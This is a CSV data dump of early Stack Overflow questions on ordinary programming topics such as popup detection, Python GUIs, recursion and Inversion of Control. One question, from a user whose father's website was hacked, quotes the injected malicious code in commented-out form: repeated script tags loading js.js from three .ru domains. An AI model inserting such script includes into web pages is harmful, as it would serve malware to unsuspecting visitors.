Id,PostTypeId,AcceptedAnswerId,ParentId,CreationDate,DeletionDate,Score,ViewCount,Body,OwnerUserId,OwnerDisplayName,LastEditorUserId,LastEditorDisplayName,LastEditDate,LastActivityDate,Title,Tags,AnswerCount,CommentCount,FavoriteCount,ClosedDate,CommunityOwnedDate,ContentLicense
"2914","1","2917","","2008-08-05 22:01:36","","135","95557","<p>Occasionally, I've come across a webpage that tries to pop open a new window (for user input, or something important), but the popup blocker prevents this from happening.</p>

<p>What methods can the calling window use to make sure the new window launched properly?</p>
","434","","403018","Chris Fournier","2011-10-31 14:16:06","2020-01-31 07:04:31","How can I detect if a browser is blocking a popup?","<popup>","8","0","41","","","CC BY-SA 3.0"
"2931","1","","","2008-08-05 22:23:16","","25","1380","<p>I have been working with <em>JXTA</em> 2.3 for the last year or so for a peer-to-peer computing platform I am developing. I am migrating to <em>JXTA</em> 2.5 and in the process I am trying to clean up a lot of my use of <em>JXTA</em>. For the most part, I approached <em>JXTA</em> with a <strong>just make it work</strong> attitude. I used it to jumpstart creating and managing my peer-to-peer overlay network and providing basic communication services. I would like to use it in a more <em>JXTA</em> way since I am making changes to move to 2.5 anyway.</p>

<p>My first step would be a basic creation of a custom <code>PeerGroup</code>. I see some new new mechanisms that are using the <code>META-INF.services</code> infrastructure of Java. Should I be listing a related <code>PeerGroup</code> implementing object here with a <em>GUID</em> in <code>net.jxta.platform.Module</code>? As I understand it, if I do this, when a group with a spec ID matching the <em>GUID</em> is encountered and joined or created it should automatically use the matching object. I should be able to just manually tie a <code>PeerGroup</code> object to the group but this new method using <code>META-INF</code> seems to be a lot easier to manage.</p>

<p>Does anyone have any pointers or examples of using this infrastructure for <code>PeerGroup</code> implementation? Also, some general information on the <code>META-INF.services</code> mechanism in Java would be helpful.</p>
","360","","2553431","","2015-10-27 09:35:19","2017-09-01 23:52:23","Getting started with a custom JXTA PeerGroup","<java><p2p><jxta>","1","1","3","","","CC BY-SA 3.0"
"2933","1","2937","","2008-08-05 22:26:00","","275","176241","<p>Python works on multiple platforms and can be used for desktop and web applications, thus I conclude that there is some way to compile it into an executable for Mac, Windows and Linux.</p>

<p>The problem being I have no idea where to start or how to write a GUI with it, can anybody shed some light on this and point me in the right direction please?</p>
","1384652","","9361512","lubos hasko","2020-10-11 06:50:09","2020-10-11 06:50:09","Create a directly-executable cross-platform GUI app using Python","<python><user-interface><deployment><tkinter><release-management>","12","0","211","","","CC BY-SA 4.0"
"2942","1","3011","","2008-08-05 22:40:25","","25","17331","<p>What tools are used for working with HSL colors in .net?</p>
","100","","4428672","","2015-12-23 12:14:41","2016-02-07 14:22:03","how to use HSL in Asp.net","<.net><colors><rgb><hsl>","3","0","7","2013-04-05 06:24:52","","CC BY-SA 3.0"
"2959","1","","","2008-08-05 23:16:30","","75","2303","<p>I have configured Indexing Service to index my files, which also include scanned images saved as hi-res <a href=""https://en.wikipedia.org/wiki/TIFF"" rel=""nofollow noreferrer"">TIFF</a> files. I also installed MS Office 2003+ and configured MS Office Document Imaging (MODI) correctly, so I can perform <a href=""https://en.wikipedia.org/wiki/Optical_character_recognition"" rel=""nofollow noreferrer"">OCR</a> on my images and even embed the <a href=""https://en.wikipedia.org/wiki/Optical_character_recognition"" rel=""nofollow noreferrer"">OCR</a>'d text into TIFFs.</p>
<p>Indexing Service is able to index and find those <a href=""https://en.wikipedia.org/wiki/TIFF"" rel=""nofollow noreferrer"">TIFF</a>-s that were manually OCR'd and re-saved with text data (using MS Document Imaging tool).</p>
<p>Turns out, Data Execution Prevention (DEP) which is deployed with Windows XP SP2 thinks MODI is malicious and refuses to let it do its magic. I have been able to get it to work by turning DEP off completely, but I found this solution to be inelegant.</p>
<p>Is there a better solution to make this work, without disabling DEP?</p>
","227","","9361512","","2020-10-10 16:17:37","2020-10-10 16:17:37","How to get Indexing Service and MODI to produce Full-text over OCR?","<ocr><modi><indexing-service>","1","4","1","","","CC BY-SA 4.0"
"2968","1","2985","","2008-08-05 23:49:53","","54","65380","<p>For parsing player commands, I've most often used the <a href=""http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#split%28java.lang.String%29"" rel=""noreferrer"">split</a> method to split a string by delimiters and then to then just figure out the rest by a series of <code>if</code>s or <code>switch</code>es. What are some different ways of parsing strings in Java?</p>
","362","","362","Lane","2014-05-13 17:34:45","2015-10-27 10:00:40","What are the different methods to parse strings in Java?","<java><string><parsing>","15","1","6","2014-05-13 17:04:48","","CC BY-SA 3.0"
"2970","1","2976","","2008-08-05 23:55:25","","24","3888","<p>My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn't technical at all, and built the whole thing with a WYSIWYG editor.</p>

<p>I popped his site open and viewed the source, and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): <a href=""http://www.98hs.ru/js.js"" rel=""noreferrer"">http://www.98hs.ru/js.js</a> &lt;-- <strong>TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL.</strong></p>

<p>So I commented it out for now. It turns out his FTP password was a plain dictionary word six letters long, so we think that's how it got hacked. We've changed his password to an 8+ digit non-word string (he wouldn't go for a passphrase since he is a hunt-n-peck typer).</p>

<p>I did a <a href=""http://whois.domaintools.com/98hs.ru"" rel=""noreferrer"">whois on 98hs.ru</a> and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too, but I seriously doubt this person is the culprit. Probably just some other site that got hacked...</p>

<p>I have no idea what to do at this point though as I've never dealt with this sort of thing before. Anyone have any suggestions?</p>

<p>He was using plain jane un-secured ftp through webhost4life.com. I don't even see a way to <em>do</em> sftp on their site. I'm thinking his username and password got intercepted?</p>

<p><strong>So, to make this more relevant to the community, what are the steps you should take/best practices you should follow to protect your website from getting hacked?</strong></p>

<p>For the record, here is the line of code that ""magically"" got added to his file (and isn't in his file on his computer -- I've left it commented out just to make absolute sure it won't do anything on this page, although I'm sure Jeff would guard against this):</p>

<pre><code>&lt;!--script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script--&gt;
</code></pre>
","58","","1695458","Chris","2017-12-21 15:07:37","2017-12-21 15:07:37","My website got hacked.. What should I do?","<security><cracking>","8","1","2","2012-03-06 03:17:01","","CC BY-SA 3.0"
"2987","1","2992","","2008-08-06 00:55:48","","46","15521","<p>I am writing an application that needs to bring window of an external app to the foreground, and not necessarily steal focus (there is a setting the user can toggle to steal/not steal focus).</p>

<p>What is the best way to go about this using the win32 API?  I have tried SetForeground() but it always steals focus and does not consistenly work.</p>

<p>What is the best way to go about this? Any thoughts?</p>
","324","","","","","2011-05-06 14:44:47","Bringing Window to the Front in C# using Win32 API","<c#><winapi>","6","0","7","","","CC BY-SA 2.5"
"2988","1","2999","","2008-08-06 00:56:05","","17","5137","<p>What are the most common problems that can be solved with both these data structures?</p>

<p>It would be good for me to have also recommendations on books that:</p>

<ul>
<li>Implement the structures</li>
<li>Implement and explain the reasoning of the algorithms that use them</li>
</ul>
","861","Camilo Diaz Repka","1571709","","2017-03-22 18:37:54","2017-03-22 18:37:54","What problems can be solved, or tackled more easily, using graphs and trees?","<algorithm><data-structures><tree><computer-science><graph-theory>","10","0","2","2013-08-16 15:07:48","","CC BY-SA 3.0"
"2993","1","5544777","","2008-08-06 01:07:52","","23","10273","<p>I'm in an environment with a lot of computers that haven't been
properly inventoried. Basically, no one knows which IP goes with which
mac address and which hostname. So I wrote the following:</p>

<pre><code># This script goes down the entire IP range and attempts to
# retrieve the Hostname and mac address and outputs them
# into a file. Yay!

require ""socket""

TwoOctets = ""10.26""

def computer_exists?(computerip)
 system(""ping -c 1 -W 1 #{computerip}"")
end

def append_to_file(line)
 file   = File.open(""output.txt"", ""a"")
 file.puts(line)
 file.close
end


def getInfo(current_ip)
 begin
   if computer_exists?(current_ip)
     arp_output = `arp -v #{current_ip}`
     mac_addr = arp_output.to_s.match(/..:..:..:..:..:../)
     host_name = Socket.gethostbyname(current_ip)
     append_to_file(""#{host_name[0]} - #{current_ip} - #{mac_addr}\n"")
   end
 rescue SocketError =&gt; mySocketError
   append_to_file(""unknown - #{current_ip} - #{mac_addr}"")
 end
end


(6..8).each do |i|
 case i
   when 6
     for j in (1..190)
       current_ip = ""#{TwoOctets}.#{i}.#{j}""
       getInfo(current_ip)
     end
   when 7
     for j in (1..255)
       current_ip = ""#{TwoOctets}.#{i}.#{j}""
       getInfo(current_ip)
     end
   when 8
     for j in (1..52)
       current_ip = ""#{TwoOctets}.#{i}.#{j}""
       getInfo(current_ip)
     end
 end
end
</code></pre>

<p>Everything works except it does not find a Reverse DNS.</p>

<p>Sample output that I'm getting is this:</p>

<pre><code>10.26.6.12 - 10.26.6.12 - 00:11:11:9B:13:9F
10.26.6.17 - 10.26.6.17 - 08:00:69:9A:97:C3
10.26.6.18 - 10.26.6.18 - 08:00:69:93:2C:E2
</code></pre>

<p>If I do <code>nslookup 10.26.6.12</code> then I get the correct reverse DNS so
that shows that my machine is seeing the DNS server.</p>

<p>I have tried <code>Socket.gethostbyname</code>, <code>gethostbyaddr</code>, but it doesn't work.</p>

<p>Any guidance will be much appreciated.</p>
","155","","128421","","2013-10-11 00:48:37","2013-10-11 00:49:43","Reverse DNS in Ruby?","<ruby><sockets><dns><nslookup>","3","0","2","","","CC BY-SA 3.0"
"3004","1","3008","","2008-08-06 01:42:51","","14","2179","<p>I am using ASP.NET Dynamic Data for a project and I have a table that has two seperate fields that link to the same foreign key in a different table.</p>

<p>This relationship works fine in SQL Server.</p>

<p>However, in the LINQ to SQL model in the ASP.NET Dynamic Data model, only the first field's relationship is reflected.  If I attempt to add the second relationship manually, it complains that it ""Cannot create an association ""ForeignTable_BaseTable"".  The same property is listed more than once: ""Id"".""</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/bb629292.aspx"" rel=""noreferrer"">This MSDN article</a> gives such helpful advice as:</p>

<ul>
<li>Examine the message and note the property specified in the message.</li>
<li>Click OK to dismiss the message box.</li>
<li>Inspect the Association Properties and remove the duplicate entries.</li>
<li>Click OK.</li>
</ul>
","364","","2134","Chris","2008-09-26 19:02:03","2008-09-26 19:02:03","Using ASP.NET Dynamic Data / LINQ to SQL, how do you have two table fields have a relationship to the same foreign key?","<asp.net><dynamic-data>","1","0","1","","","CC BY-SA 2.5"
"3017","1","3029","","2008-08-06 02:15:14","","234","454401","<p>By ""generate"", I mean auto-generation of the code necessary for a particular selected (set of) variable(s).</p>

<p>But any more explicit explication or comment on good practice is welcome.</p>
","391","","63550","EnderMB","2019-12-09 17:56:00","2019-12-25 23:38:43","How can we generate getters and setters in Visual Studio?","<c#><visual-studio><setter><getter>","16","0","49","","","CC BY-SA 4.0"
"3021","1","","","2008-08-06 02:29:51","","121","194483","<p>One of the topics that seems to come up regularly on mailing lists and online discussions is the merits (or lack thereof) of doing a Computer Science Degree. An argument that seems to come up time and again for the negative party is that they have been coding for some number of years and they have never used recursion.</p>

<p>So the question is:</p>

<ol>
<li>What is recursion?</li>
<li>When would I use recursion?</li>
<li>Why don't people use recursion?</li>
</ol>
","358","","2134","Chris Fournier","2008-08-25 05:15:53","2016-12-26 01:59:29","What is recursion and when should I use it?","<recursion><computer-science>","40","2","108","","2014-03-11 09:47:20","CC BY-SA 2.5"
"3027","1","","","2008-08-06 02:36:23","","22","2359","<p>What is the best unobtrusive CAPTCHA for web forms? One that does not involve a UI, rather a non-UI Turing test. I have seen a simple example of a non UI CAPTCHA like the <a href=""http://www.asp.net/AJAX/AjaxControlToolkit/Samples/NoBot/NoBot.aspx"" rel=""noreferrer"">Nobot</a>  control from Microsoft. I am looking for a CAPTCHA that does not ask the user any question in any form. No riddles, no what's in this image.</p>
","439","","1","Jeff Atwood","2008-08-12 10:37:28","2013-01-09 05:40:10","Is there an Unobtrusive Captcha for web forms?","<security><usability><captcha>","5","1","4","","","CC BY-SA 2.5"
"3033","1","3360","","2008-08-06 02:53:13","","107","116849","<p>If I have a Perl hash with a bunch of (key, value) pairs, what is the preferred method of iterating through all the keys?  I have heard that using <code>each</code> may in some way have unintended side effects.  So, is that true, and is one of the two following methods best, or is there a better way?</p>

<pre><code># Method 1
while (my ($key, $value) = each(%hash)) {
    # Something
}

# Method 2
foreach my $key (keys(%hash)) {
    # Something
}
</code></pre>
","219","","2766176","brian d foy","2008-12-03 04:11:28","2015-12-05 23:00:21","What's the safest way to iterate through the keys of a Perl hash?","<perl><hash><iteration><each>","9","0","26","","","CC BY-SA 2.5"
"3045","1","3053","","2008-08-06 03:14:59","","15","445","<p><strong>Problem:</strong> </p>

<p>I have two spreadsheets that each serve different purposes but contain one particular piece of data that needs to be the same in both spreadsheets.  This piece of data (one of the columns) gets updated in spreadsheet A but needs to also be updated in spreadsheet B.</p>

<p><strong>Goal:</strong></p>

<p>A solution that would somehow link these two spreadsheets together (keep in mind that they exist on two separate LAN shares on the network) so that when A is updated, B is automatically updated for the corresponding record.</p>

<p>*Note that I understand fully that a database would probably be a better plan for tasks such as these but unfortunately I have no say in that matter.</p>

<p>**Note also that this needs to work for Office 2003 and Office 2007</p>
","271","","123743","Mark Biek","2012-05-01 15:32:25","2012-05-01 15:32:25","Linking two Office documents","<office-2007><office-2003>","2","0","1","","","CC BY-SA 2.5"
"3049","1","3054","","2008-08-06 03:19:19","","50","12586","<p>I need to send and receive data over serial connections (RS-232 and RS-422).</p>

<p>How do I set up and communicate with such a connection?  How do I figure out what the configuration settings (e.g. baud rate) should be and how do I set them?</p>

<p>In particular I am looking to do this in Java, C/C++, or one of the major Unix shells but I also have some interest in serial programming using Windows/Hyperterminal.</p>
","462","","","","","2016-01-28 18:00:18","How do I configure and communicate with a serial port?","<java><c++><windows><unix>","10","0","6","2018-09-26 14:00:05","","CC BY-SA 2.5"
"3057","1","3062","","2008-08-06 03:34:01","","23","7987","<p>In interpreted programming languages, such as PHP and JavaScript, what are the repercussions of going with an Object Oriented approach over a Procedural approach?</p>

<p>Specifically what I am looking for is a checklist of things to consider when creating a web application and choosing between Procedural and Object Oriented approaches, to optimize not only for speed, but maintainability as well. Cited research and test cases would be helpful as well if you know of any articles exploring this further.</p>

<p>Bottom line: how big (if any) is the performance hit really, when going with OO vs. Procedural in an interpreted language?</p>
","58","","4490559","Gaius","2017-05-02 20:04:35","2017-05-02 20:04:35","Speed Comparisons - Procedural vs. OO in interpreted languages","<performance><oop><maintainability><procedural><interpreted-language>","7","0","2","","","CC BY-SA 2.5"
"3058","1","3140","","2008-08-06 03:35:27","","1926","524317","<p>Inversion of Control (IoC) can be quite confusing when it is first encountered.</p>

<ol>
<li>What is it?</li>
<li>Which problem does it solve?</li>
<li>When is it appropriate to use and when not?</li>
</ol>
","358","","3739391","","2019-12-06 20:52:09","2020-12-18 18:22:54","What is Inversion of Control?","<oop><design-patterns><inversion-of-control>","38","7","832","","","CC BY-SA 4.0"
"3061","1","3071","","2008-08-06 03:36:08","","1880","780864","<p>What is the best way to go about calling a function given a string with the function's name in a Python program.  For example, let's say that I have a module <code>foo</code>, and I have a string whose content is <code>""bar""</code>. What is the best way to call <code>foo.bar()</code>?</p>

<p>I need to get the return value of the function, which is why I don't just use <code>eval</code>. I figured out how to do it by using <code>eval</code> to define a temp function that returns the result of that function call, but I'm hoping that there is a more elegant way to do this.</p>
","121","","11575","","2019-01-23 15:03:25","2020-07-16 15:20:48","Calling a function of a module by using its name (a string)","<python><object>","14","0","497","","","CC BY-SA 4.0"
"3067","1","","","2008-08-06 03:44:41","","24","7928","<p>If you've ever used Eclipse, you've probably noticed the great keyboard shortcuts that let you hit a shortcut key combination, then just type the first few characters of a function, class, filename, etc. It's even smart enough to put open files first in the list.</p>

<p><img src=""https://i.stack.imgur.com/aLKhF.png"" alt=""alt text""></p>

<p>I'm looking for a similar functionality for Visual Studio 2008. I know there's a findfiles plugin on codeproject, but that one is buggy and a little weird, and doesn't give me access to functions or classes.</p>
","291","","1219121","Vaibhav","2012-04-01 10:02:38","2015-08-20 22:14:18","Plugin for Visual Studio to Mimic Eclipse's ""Open Type"" or ""Open Resource"" Keyboard Access","<visual-studio><plugins>","9","0","1","","","CC BY-SA 3.0"
"3075","1","3084","","2008-08-06 04:20:41","","14","1488","<p>I have a simple page with my <code>ScriptManager</code> and my <code>UpdatePanel</code>, and my <code>ContentTemplate</code> has one <code>ListBox</code> and one Label.  I am just trying to catch its <code>OnSelectionChanged</code> so I can update the text in the <code>Label</code>.  No matter what settings I try to tweak, I always get a full-page postback.</p>

<p>Is this really not going to work, or am I just screwing this up?</p>
","404","","2833965","","2015-12-15 05:58:39","2015-12-15 05:58:39","Can ASP.NET AJAX partial rendering work inside a SharePoint 2007 application page?","<ajax><sharepoint>","6","0","1","","","CC BY-SA 3.0"
"3088","1","","","2008-08-06 05:01:16","","324","141975","<p><strong>Original Question</strong></p>

<p>I am currently engaged in teaching my brother to program.  He is a total beginner, but very smart. (And he actually wants to learn).  I've noticed that some of our sessions have gotten bogged down in minor details, and I don't feel I've been very organized. (<em>But the answers to this post have helped a lot.</em>)</p>

<p>What can I do better to teach him effectively?  Is there a logical order that I can use to run through concept by concept?  Are there complexities I should avoid till later?</p>

<p>The language we are working with is <a href=""http://www.python.org"" rel=""noreferrer"">Python</a>, but advice in any language is welcome.</p>

<hr>

<p><strong>How to Help</strong></p>

<p>If you have good ones please add the following in your answer:</p>

<ul>
<li>Beginner Exercises and Project Ideas</li>
<li>Resources for teaching beginners</li>
<li>Screencasts / blog posts / free e-books</li>
<li>Print books that are good for beginners</li>
</ul>

<p>Please describe the resource <em>with a link to it</em> so I can take a look.  I want everyone to know that I have definitely been using some of these ideas.  Your submissions will be aggregated in this post.</p>

<hr>

<p><strong>Online Resources</strong> for teaching beginners:</p>

<ul>
<li><a href=""http://ocw.mit.edu/OcwWeb/Electrical-Engineering-and-Computer-Science/6-189January--IAP--2008/CourseHome/"" rel=""noreferrer"">A Gentle Introduction to Programming Using Python</a></li>
<li><a href=""http://openbookproject.net/thinkcs/python/english2e/index.html"" rel=""noreferrer"">How to Think Like a Computer Scientist</a></li>
<li><a href=""http://www.alice.org/"" rel=""noreferrer"">Alice: a 3d program for beginners</a></li>
<li><a href=""http://scratch.mit.edu/"" rel=""noreferrer"">Scratch (A system to develop programming skills)</a></li>
<li><a href=""http://www.htdp.org/"" rel=""noreferrer"">How To Design Programs</a></li>
<li><a href=""http://mitpress.mit.edu/sicp/full-text/book/book.html"" rel=""noreferrer"">Structure and Interpretation of Computer Programs</a></li>
<li><a href=""http://pine.fm/LearnToProgram/"" rel=""noreferrer"">Learn To Program</a></li>
<li><a href=""http://samizdat.mines.edu/howto/HowToBeAProgrammer.html"" rel=""noreferrer"">Robert Read's How To Be a Programmer</a></li>
<li><a href=""http://creators.xna.com/"" rel=""noreferrer"">Microsoft XNA</a></li>
<li><a href=""http://vodpod.com/watch/914464-inspirational-oscon-keynote"" rel=""noreferrer"">Spawning the Next Generation of Hackers</a></li>
<li><a href=""http://deimos3.apple.com/WebObjects/Core.woa/Browse/unsw.edu.au.1504975442.01504975444"" rel=""noreferrer""><em>COMP1917 Higher Computing</em> lectures by Richard Buckland</a> (requires iTunes)</li>
<li><a href=""http://diveintopython.net/"" rel=""noreferrer"">Dive into Python</a></li>
<li><a href=""http://en.wikibooks.org/wiki/Programming:Python"" rel=""noreferrer"">Python Wikibook</a></li>
<li><a href=""http://projecteuler.net/"" rel=""noreferrer"">Project Euler</a> - sample problems (mostly mathematical)</li>
<li><a href=""http://www.pygame.org/"" rel=""noreferrer"">pygame</a> - an easy python library for creating games</li>
<li><a href=""http://inventwithpython.com/IYOCGwP_book1.pdf"" rel=""noreferrer"">Invent Your Own Computer Games With Python</a></li>
<li><a href=""http://codebetter.com/blogs/karlseguin/archive/2008/06/24/foundations-of-programming-ebook.aspx"" rel=""noreferrer"">Foundations of Programming</a> for a next step beyond basics.</li>
<li><a href=""http://www.iam.unibe.ch/~scg/SBE/"" rel=""noreferrer"">Squeak by Example</a> </li>
<li><a href=""http://www.briggs.net.nz/log/writing/snake-wrangling-for-kids/"" rel=""noreferrer"">Snake Wrangling For Kids</a> (It's not just for kids!)</li>
</ul>

<hr>

<p><strong>Recommended Print Books</strong> for teaching beginners</p>

<ul>
<li><a href=""http://www.acceleratedcpp.com/"" rel=""noreferrer"">Accelerated C++</a></li>
<li><a href=""https://rads.stackoverflow.com/amzn/click/com/1598631128"" rel=""noreferrer"" rel=""nofollow noreferrer"">Python Programming for the Absolute Beginner</a></li>
<li><a href=""https://rads.stackoverflow.com/amzn/click/com/0735611319"" rel=""noreferrer"" rel=""nofollow noreferrer"">Code by Charles Petzold</a></li>
<li><a href=""https://rads.stackoverflow.com/amzn/click/com/1590282418"" rel=""noreferrer"" rel=""nofollow noreferrer"">Python Programming: An Introduction to Computer Science 2nd Edition</a></li>
</ul>
","92","","447356","epatel","2011-11-24 11:03:40","2012-08-04 01:54:34","Best ways to teach a beginner to program?","<python><language-agnostic>","86","2","596","2011-09-14 17:54:00","2008-09-03 05:10:42","CC BY-SA 3.0"
"3106","1","3119","","2008-08-06 05:36:49","","21","4886","<p>I'm developing some cross platform software targeting Mono under Visual Studio and would like to be able to build the installers for Windows and Linux (Ubuntu specifically) with a single button click. I figure I could do it by calling cygwin from a post-build event, but I was hoping for at best a Visual Studio plugin or at worst a more Windows-native way of doing it. It seems like the package format is fairly simple and this must be a common need.</p>

<p>edit: Re-asked question under other account due to duplicate login issue.</p>
","327","","23855","chills42","2008-11-03 13:09:51","2018-09-06 11:01:29","How can I create Debian install packages in Windows for a Visual Studio project?","<windows><visual-studio><mono><cross-platform>","5","0","3","","","CC BY-SA 2.5"
